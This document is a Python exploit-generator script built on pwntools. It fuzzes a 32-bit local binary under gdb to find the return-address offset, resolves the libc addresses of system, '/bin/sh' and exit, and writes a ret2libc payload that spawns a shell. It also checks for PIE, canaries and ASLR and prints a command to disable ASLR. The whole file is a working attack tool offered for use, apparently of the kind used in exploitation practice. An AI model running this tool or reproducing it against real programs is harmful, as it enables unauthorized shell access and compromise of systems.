#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import subprocess
import re
import termcolor
import struct
import sys
import argparse
import pdb

file_name = ''
buffer_size = 0
libc_address, libc_location = '',''
system_address = ''
bin_sh_address = ''
exit_address = ''


def mitigations_checks():
    global file_name
    elf_file = ELF(file_name, False)
    if elf_file.pie:
        print(termcolor.colored("[-]", 'red', attrs=['bold']), end='')
        print(' PIE is enabled, the exploit will not work.')
        sys.exit(0)

    if elf_file.canary:
        print(termcolor.colored("[-]", 'red', attrs=['bold']), end='')
        print(' Stack canary is enabled, the exploit will not work.')
        sys.exit(0)

    with open("/proc/sys/kernel/randomize_va_space","r") as f:
        if int(f.readline()) != 0:
            print(termcolor.colored("[-]", 'red', attrs=['bold']),end='')
            print(' ASLR is enabled, the exploit will not work.')
            print('You can disable ASLR if you have root privileges using the following command: ')
            print(termcolor.colored('echo 0 | sudo tee /proc/sys/kernel/randomize_va_space', attrs=['bold']))
            sys.exit(0)



def fuzz(max_length=2000,stdin=False):
    global buffer_size, file_name
    fuzz_length = 100
    while (fuzz_length < max_length):
        if not stdin:

            fuzzing_out = subprocess.check_output(['gdb', '-q', '-ex', f'run {cyclic(fuzz_length).decode()}', '-ex', 'quit', '-batch', file_name]).decode()
            if "SIGSEGV" in fuzzing_out:
                break
            else:
                fuzz_length += 100

        else:
            with open("./fuzz", "wb") as fuzz:
                fuzz.write(cyclic(fuzz_length))
            fuzzing_out = subprocess.check_output(['gdb', '-q', '-ex', 'run < fuzz', '-ex', 'quit', '-batch', file_name]).decode()
            if "SIGSEGV" in fuzzing_out:
                break
            else:
                fuzz_length += 100
   
    try:
        eip_after_crash = re.search('^0[xX][0-9a-fA-F]+', fuzzing_out, flags=re.MULTILINE).group(0)

    except:
        print(termcolor.colored("[-]", 'red', attrs=['bold']), end='')
        print(f' Could not crash the program, try increasing the maximum fuzzing length (-l flag).')
        sys.exit(0)

    buffer_size = cyclic_find(int(eip_after_crash, 16))
    if buffer_size < 1 or buffer_size > max_length:
        print(termcolor.colored("[-]", 'red', attrs=['bold']), end='')
        print(f' Something went wrong, EIP could not be overrwitten probably.')
        sys.exit(0)
    print(termcolor.colored("[*]", 'green',attrs=['bold']), end='')
    print(f' Found buffer size: ', end='')
    print(termcolor.colored(buffer_size, attrs=['bold']))
    return buffer_size



def libc():
    global file_name
    ldd_out = subprocess.check_output(['ldd', file_name]).decode()
    for line in ldd_out.split('\n'):
        if "libc" in line:
            libc_addr = re.search('0[xX][0-9a-fA-F]+', line).group(0)
            libc_location = re.search('((?<!\w)(\.{1,2})?(?<!\/)(\/((\\\b)|[^ \b%\|:\n\"\\\/])+)+\/?)', line).group(0)
            print(termcolor.colored("[*]", 'green',attrs=['bold']), end='')
            print(f' Found libc address: ', end='')
            print(termcolor.colored(libc_addr, attrs=['bold']))
            print(termcolor.colored("[*]", 'green', attrs=['bold']), end='')
            print(f' Found libc location: ', end='')
            print(termcolor.colored(libc_location, attrs=['bold']))
            return int(libc_addr, 16), libc_location
    
    print(termcolor.colored("[-]", 'red', attrs=['bold']))
    print(f' Could not find libc, try using ROP')
    sys.exit(0)

def system():
    global libc_location
    libc = ELF(libc_location, False)
    system_offset = libc.functions['system'].address
    system_addr = hex(system_offset + libc_address)
    print(termcolor.colored("[*]", 'green', attrs=['bold']), end='')
    print(f' Found system address: ', end='')
    print(termcolor.colored(system_addr, attrs=['bold']))
    return system_addr


def bin_sh():
    global libc_location
    libc = ELF(libc_location, False)
    bin_sh_offset = next(libc.search(b'/bin/sh'))
    bin_sh_addr = hex(bin_sh_offset + libc_address)
    print(termcolor.colored("[*]", 'green', attrs=['bold']), end='')
    print(f' Found "/bin/sh" address: ', end='')
    print(termcolor.colored(bin_sh_addr, attrs=['bold']))        
    return bin_sh_addr


def exit_func():
    global libc_location
    libc = ELF(libc_location, False)
    exit_offset = libc.functions['exit'].address
    exit_addr = hex(exit_offset + libc_address)
    print(termcolor.colored("[*]", 'green', attrs=['bold']), end='')
    print(f' Found exit address: ', end='')
    print(termcolor.colored(exit_addr, attrs=['bold']))
    return exit_addr

def exploit():
    global buffer_size
    global system_address
    global bin_sh_address
    global exit_address

    exploit = b"A" * buffer_size
    exploit += p32(int(system_address, 16))
    exploit += p32(int(exit_address,16))
    exploit += p32(int(bin_sh_address, 16))
    with open('./exploit', 'wb') as exp:
        exp.write(exploit)
    print(termcolor.colored("[*]", 'green', attrs=['bold']), end='')
    print(termcolor.colored(" Exploit successfully created, good luck!", attrs=['bold']))


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("file", help="The file you want to attack.", type=str)
    parser.add_argument("-s", "--stdin", help="The fuzzer will use stdin instead of passing an argument.", action="store_true")
    parser.add_argument("-nf", "--no-fuzz", help="Disables the fuzzer.", action="store_true")
    parser.add_argument("-l", "--length", help="Sets the maximum fuzzing length.", metavar='', type=int)
    parser.add_argument("-b", "--buffer", help="Sets the buffer size to the specified value. Using this option will disable the fuzzer.", metavar='', type=int)
    args = parser.parse_args()

    global file_name
    global buffer_size
    global libc_address
    global libc_location
    global system_address
    global bin_sh_address
    global exit_address

    file_name = args.file

    mitigations_checks()

    if args.buffer:
        buffer_size = args.buffer

    elif not args.no_fuzz:

        if args.stdin and args.length:
            buffer_size = fuzz(args.length, stdin=True)

        elif args.stdin:
            buffer_size = fuzz(stdin=True)

        elif args.length:
            buffer_size = fuzz(args.length, stdin=False)

        else:
            buffer_size = fuzz(stdin=False)

    libc_address, libc_location = libc()
    system_address = system()
    bin_sh_address = bin_sh()
    exit_address = exit_func()

    if buffer_size and args.stdin:
        exploit()
        print(termcolor.colored("[+]", 'green', attrs=['bold']), end='')
        print(f' Exploit Usage: ', end='')
        print(termcolor.colored(f"(cat exploit; cat) | {file_name}", attrs=['bold']))
        sys.exit()

    if buffer_size:
        exploit()
        print(termcolor.colored("[+]", 'green', attrs=['bold']), end='')
        print(f' Exploit Usage: ', end='')
        print(termcolor.colored(f"{file_name} $(cat exploit)", attrs=['bold']))
        


if __name__ == '__main__':
    main()

